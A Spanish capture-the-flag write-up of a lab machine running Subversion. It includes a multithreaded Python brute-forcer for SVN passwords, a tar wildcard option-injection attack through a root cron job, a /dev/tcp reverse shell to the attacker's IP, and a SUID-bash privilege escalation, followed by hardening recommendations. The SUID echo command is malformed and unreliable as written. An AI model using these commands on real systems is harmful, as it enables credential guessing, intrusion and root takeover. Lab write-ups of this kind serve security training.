# Subversion

## Resumen ejecutivo

Este laboratorio de hacking se centra en una máquina vulnerable que ofrece un servicio Subversion (SVN) accesible a través de varios puertos. Durante el ejercicio se exploran técnicas de reconocimiento, fuerza bruta de credenciales SVN, revisión de un binario personalizado con vulnerabilidades de desbordamiento de búfer y explotación de un servicio cron con inyección de opciones. El objetivo es comprometer la máquina, escalar privilegios y finalmente obtener acceso root.

## 1. Reconocimiento inicial

El laboratorio comienza con un **escaneo de nmap** que revela los siguientes puertos abiertos:

- `80` (HTTP)
- `1789` (puerto de ejecución interactiva)
- `3690` (servicio Subversion)

![alt text](img/1-nmap.png)

Un posterior escaneo con **gobuster** en el puerto 80 descubre un recurso `/upload`. Al visitarlo se descarga un archivo que contiene un consejo que hace referencia a la ejecución del servicio Subversion, por lo cual se infiere que la vía de ataque tendrá relación con este servicio:

![alt text](img/2-gobuster.png)
![alt text](img/3-advice.png)

El puerto `3690` solo ofrece una página de configuración mínima cuando se accede vía web:

![alt text](img/4-3690Port.png)

Visitar el servicio HTTP muestra una página informativa sobre la palabra *subversion*, sin información relevante, por lo que se procede a interactuar más directamente con él:

![alt text](img/5-subversionService.png)

Al acceder a ciertas rutas bajo `http://<IP>/subversion` se detecta un servicio de autenticación que requiere credenciales.

## 2. Fuerza bruta de SVN

Para obtener acceso se utiliza el usuario genérico `svnuser` que es habitual en este tipo de despliegues. Se desarrolla un script en Python que realiza fuerza bruta usando una wordlist (`rockyou.txt`), lanzando múltiples hilos contra el cliente `svn` y gestionando los errores de autenticación:

```bash
#!/usr/bin/env python3
import subprocess
import threading
from queue import Queue
import time
import sys

# Configuración
url = "svn://172.17.0.2/subversion"
usuario = "svnuser"
wordlist = "/usr/share/wordlists/rockyou.txt"
num_threads = 10
timeout_segundos = 10

# Cola de contraseñas
cola = Queue()
encontrada = False
lock = threading.Lock()

def probar_password():
    global encontrada
    while not encontrada and not cola.empty():
        try:
            password = cola.get(timeout=1)
        except:
            continue
            
        if encontrada:
            cola.task_done()
            break
            
        print(f"\r[+] Probando: {password[:20]}...", end="", flush=True)
        
        try:
            # Comando SVN con timeout y opciones para evitar interacción
            cmd = [
                "svn", "ls",
                "--username", usuario,
                "--password", password,
                "--non-interactive",  # No preguntar nada
                "--no-auth-cache",    # No guardar credenciales
                "--trust-server-cert-failures=unknown-ca,cn-mismatch,expired,not-yet-valid,other",  # Ignora errores de certificado
                url
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout_segundos
            )
            
            # Si el comando funciona (returncode 0) y no hay error de auth
            if result.returncode == 0:
                with lock:
                    if not encontrada:
                        encontrada = True
                        print(f"\n\n🚨 ¡CONTRASEÑA ENCONTRADA! 🚨")
                        print(f"Usuario: {usuario}")
                        print(f"Contraseña: {password}")
                        print(f"Salida del comando:\n{result.stdout[:200]}")
                        
            # Análisis de errores específicos
            elif "Authentication failed" in result.stderr:
                pass  # Sigue intentando
            elif "denied" in result.stderr:
                pass
            else:
                # Otro tipo de error, puede ser útil debuggear
                with lock:
                    print(f"\n[!] Error inesperado con {password}: {result.stderr[:50]}")
                    
        except subprocess.TimeoutExpired:
            with lock:
                print(f"\n[!] Timeout con {password}")
        except Exception as e:
            with lock:
                print(f"\n[!] Excepción: {e}")
        finally:
            cola.task_done()

def cargar_wordlist(archivo, limite=None):
    print(f"[*] Cargando wordlist: {archivo}")
    count = 0
    try:
        with open(archivo, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if password:  # Ignorar líneas vacías
                    cola.put(password)
                    count += 1
                    if limite and count >= limite:
                        break
    except FileNotFoundError:
        print(f"[-] No se encuentra el archivo: {archivo}")
        sys.exit(1)
    
    print(f"[+] {count} contraseñas cargadas")
    return count

# Main
if __name__ == "__main__":
    print("="*60)
    print("🚀 FUERZA BRUTA SVN - subversion")
    print("="*60)
    print(f"URL: {url}")
    print(f"Usuario: {usuario}")
    print(f"Wordlist: {wordlist}")
    print(f"Hilos: {num_threads}")
    print("="*60)
    
    # Cargar wordlist (opcional: poner límite para pruebas rápidas)
    # total = cargar_wordlist(wordlist, limite=1000)  # Para pruebas
    total = cargar_wordlist(wordlist)
    
    input("\n[?] Presiona Enter para comenzar...")
    
    start_time = time.time()
    
    # Crear y lanzar hilos
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=probar_password, daemon=True)
        t.start()
        threads.append(t)
    
    # Esperar a que terminen
    try:
        cola.join()
    except KeyboardInterrupt:
        print("\n\n[!] Interrumpido por el usuario")
    
    end_time = time.time()
    
    if not encontrada:
        print("\n[-] No se encontró la contraseña")
    
    print(f"\n[*] Tiempo total: {end_time - start_time:.2f} segundos")
```

![alt text](img/6-bruteForceSubversion.png)

Posteriormente y con la contraseña, se loguea de forma exitosa, esto nos da el repositorio subversion, el cual contiene informacion muy relevante, de lo que destaca un binario subversion:

![alt text](img/7-SubversionContent.png)
![alt text](img/10-subversionFile.png)

Dicho binario realiza una serie de preguntas, que tiene respuestas especificas, no se llega a mucho respondiendo directamente, por lo que se decide analizrlo usando guidra, de este analisis se rescatan 4 funciones importantes: main, ask_questions, magix_text y shell.

![alt text](img/8-main.png)
![alt text](img/8-askQuestions.png)
![alt text](img/8-magictext.png)

![alt text](img/8-shell.png)

La primera llama a la segunda, la cual crea un numero aleatorio y hace las preguntas (ahio se revelan las respuestas correctas) luego se llama a magic test, el cual espera un valor (pero usa la funcion get, la cual es suceptible a buffer overflow) y el ultimo, no esta siendo llamado pero es parte del binario, siendo una funcion que abre una shell. Al final, la segunda funcion espera un numero (el numero "aleatorio que se genrea al inicio") y posteriormente ejecuta la funcion magic_text.

Con esto, se presenta un vector de ataque completo, se realizara un scriopt en python que cpmplete las preguntas, y que posteriormente adivine el numero aleatorio, aprovechando que los numeros random en programacion no son realmente aleatorios, son mas generados en base a una semilla. Con ingenieria inversa y entendiendo como se genera, es posible encontrar el numero "pseudo aleatorio" y con esto ejecutar magic_text y asi poder aprovechar el buffer overfloow, con el objetivo de sobreescribir e insertar la direccion de memoria de la funcion shell, para que al sobrecargarse la memoria, se ejecute dicho metodo. Una vez creado el script se ejecuta, y se ve que ha sido ejecutado de forma correcta:

![alt text](img/8-GetSecretNumber.png)

En un inicio solo encontraba hasta el numero, con algunos cambios se inserta la direccion de memoria de la shell, la cual es la siguiente:

![alt text](img/9-shellMemoryPosition.png)

Una vez probado y agregado el exploit, este se ejecuta nuevamente a modo de test, viendo que ejecuto una bash de nuestra maquina, se hacen los ultimos retoques para que de una shell con un ususario de sus sitema:

maquina atacante:

![alt text](img/11-Subversionexploit.png)

Usuario luigi del sistema:

![alt text](img/12-SubversionLuiguiShell.png)

Se verifican archivos y binarios SUID sin resultado, por lo que se revisan los procesos corriendo:

![alt text](img/13-Psaux.png)

Varios por parte de root, sospechoso, se revisa el archivo /etc/crontab:

![alt text](img/14-etcCrontab.png)

Aqui se ve que se que se ejecuta de forma seguida un binario que su funcion es almacenar en formato .tar todos los archivos que hay en /home/luigi. Sin embargo usar el operador * en rutas controladas es peligroso, ya que este formato es suceptible a ataquees de inyeccion de instrucciones por medio de archivos.

## 3. Explotación del crontab

Se aprovecha la inyección de opciones creando archivos que actúan como parámetros para tar:

```bash
cd /home/luigi/

# Crear archivos que actúan como opciones de tar
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# Crear el script que va a ejecutar tar
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/172.17.0.1/5555 0>&1
EOF
```

Al principio se probó con una reverse shell, pero no funcionó; por ello se modificó `shell.sh` para que simplemente convierta `/bin/bash` en SUID root:

```bash
echo -r '#! /bin/bash\chmod +s /bin/bash' > shell.sh
```

Cuando el cron corre, el binario tar ejecuta el script y se otorgan permisos SUID a bash. Ejecutando `bash -p` se obtiene una shell root directamente:

![alt text](img/15-root.png)

¡Finalmente somos root!

## Recomendaciones

- **Servicio SVN expuesto:** Restringir el acceso al puerto 3690 mediante restricciones de firewall y deshabilitar servicios innecesarios.
- **Credenciales débiles:** Utilizar políticas de contraseñas seguras y autenticación multifactor para el acceso SVN.
- **Binario con vulnerabilidad de buffer overflow y RNG predecible:** Auditar y corregir el código, usar funciones seguras (`fgets` con límites) y generadores de números aleatorios criptográficamente seguros.
- **Cron inseguro con expansión de comodines:** Evitar el uso de `*` en rutas controladas, especificar archivos explícitamente o utilizar `tar --` para prevenir la interpretación de nombres como opciones.
